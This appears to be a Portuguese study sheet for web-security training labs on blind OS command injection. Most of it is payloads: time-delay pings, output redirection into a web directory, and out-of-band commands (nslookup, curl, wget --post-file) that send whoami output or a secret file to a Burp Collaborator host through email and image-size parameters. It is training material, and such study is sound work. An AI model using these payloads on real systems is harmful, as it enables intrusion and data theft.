# OS Command Injection

Probabilidade: $${\color{red}Alta}$$.

Normalmente o Command Injection aparece nos parâmetros que envolvem e-mail, como na feature the submeter feedback.

Aprenda alguns comandos além do que é ensinado nos laboratórios para exfiltrar dado, visto que nem sempre o comando que você testa primeiro existe ou funciona no alvo.

Algumas variações:
```
nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN

curl+burp.oastify.com?c=`whoami`

nslookup+-q=cname+$(whoami).burp.oastify.com

$(curl $(cat /home/carlos/secret).OASTIFY.COM)

/usr/bin/wget --post-file /home/carlos/secret https://collaborator/
```

<br>

## Laboratórios

**Blind OS Command Injection with Time Delays**
```
email=x||ping+-c+10+127.0.0.1||
```

<br>
<br>

**Blind OS Command Injection with Output Redirection**

Tem um diretório passível de escrita em `/var/qwww/images/`.
```
||+whoami+>+/var/www/images/whoami.txt||
```

Acesse o arquivo em: `/image?filename=whoami.txt`.

<br>
<br>

**Blind OS Command Injection with Out-of-Band Interaction**
```
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```

<br>
<br>

**Blind OS Command Injection with Out-of-Band Data Exfiltration**
```
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```

<br>
<br>

**Admin Panel ImgSize Command Injection**
```
/admin-panel/admin_image?image=/blog/posts/50.jpg&ImageSize="200||nslookup+$(cat+/home/carlos/secret).<collaborator>%26"  
```

Outra opção:
```
ImgSize="`/usr/bin/wget%20--post-file%20/home/carlos/secret%20https://collaborator/`"
```
